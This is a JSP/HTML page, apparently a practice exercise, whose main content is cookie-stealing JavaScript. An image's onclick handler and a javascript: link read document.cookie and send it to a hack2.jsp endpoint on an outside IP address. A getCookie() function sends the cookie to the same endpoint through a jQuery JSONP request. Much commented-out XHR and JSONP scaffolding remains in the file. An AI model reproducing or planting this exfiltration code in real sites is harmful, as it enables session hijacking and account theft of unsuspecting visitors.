<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=EUC-KR">
<title>Insert title here</title>
<script type="text/javascript" src = "/test/jquery.js"></script>
</head>
<body>

<img id = "image" src = "http://14.63.199.46/a.jpg" alt="이미지 파일" width="200px"
onclick ="javascript: var cookie = document.cookie; document.getElementById('image').src='http://14.63.199.46/testBoard/hack2.jsp?name='+cookie;"> 

<a href = "javascript: var cookie = document.cookie; document.getElementById('image').src='http://14.63.199.46/testBoard/hack2.jsp?name='+cookie;">안상근</a>

<!-- <img id = "image" src = "http://14.63.199.46/a.jpg" alt="이미지 파일" width="200px"
onclick ="javascript: var cookie = document.cookie; document.getElementById('image').src='/test/hack2.jsp?name=AnSangGeun2';"/>

 -->

<script type="text/javascript">

// 	var xmlHttp;
 	
//  	function createXMLHttpRequest(){
//  		if(window.ActiveXObject){
//  			xmlHttp = new ActiveXObjext("Microsoft.XMLHTTP");
//  		}
//  		else if (window.XMLHttp)
//  	}

	function getCookie(){
		
		
		//document.location.href = "http://localhost/test/hack2.jsp?name='안상근'";
		
		
 		document.cookie = "aaaaa";
 		
 		var cookie= document.cookie;
		
		
 		
 		
		$.ajax({
			
			"data":{"name":cookie},
			"url" : "http://14.63.199.46/testBoard/hack2.jsp",
	//		"url" : "/test/hack2.jsp",
			"dataType": "jsonp",
			"method": "GET",
			//"url" : "http://14.199.63.46/testBoard/hack2.jsp",
			success:function(data){
				alert(data.success);
			},
			error:function(a,b,c){
				alert("adsfjkasdfljk");
			}
			
			
		});
		
// 		var xhr;
// 		function createXMLHttpRequest(){
			
// 			if(window.AtiveXObject){
// 				xhr = new ActiveXObject("Microsoft.XMLHTTP");
// 			}else{
// 				xhr = new XMLHttpRequest();
// 			}
			
// 	    	var url = "http://14.63.199.46/testBoard/hack2.jsp";
			
// 			var url = "/test/hack2.jsp";
			
// 		}
		
// 		function openRequest(){
			
// 			createXMLHttpRequest();
			
// 			xhr.onreadystatechange = getdata;
			
// 			xhr.open("POST",url,true);
// 			xhr.setRequestHeader("Content-Type",'application/x-www-form-urlencoded');
// 			xhr.send(data);	
// 		}
// 		function getdata(){
// 			if(xhr.readyState==4){
// 				if(xhr.status==200){
// 					var txt = xhr.responseText;
// 					alert(txt);
// 				}
// 			}
			
// 		}

	}
// 		function jsonp(url, callback) {
// 		    var callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
// 		    window[callbackName] = function(data) {
// 		        delete window[callbackName];
// 		        document.removeChild(script);
// 		        callback(data);
// 		    };

// 		    var script = document.createElement('script');
// 		    script.src = (url.indexOf('?') >= 0 ? '&' : '?') + 'callback=' + callbackName;
// 		    document.appendChild(script);
// 		}

// 		jsonp('/test/hack2.jsp', function(data) {
// 		   alert(data);
// 		});
	
	
	
</script>
</body>

<a href="/test/hack2.jsp?name='안상근'">클릭</a>
</html>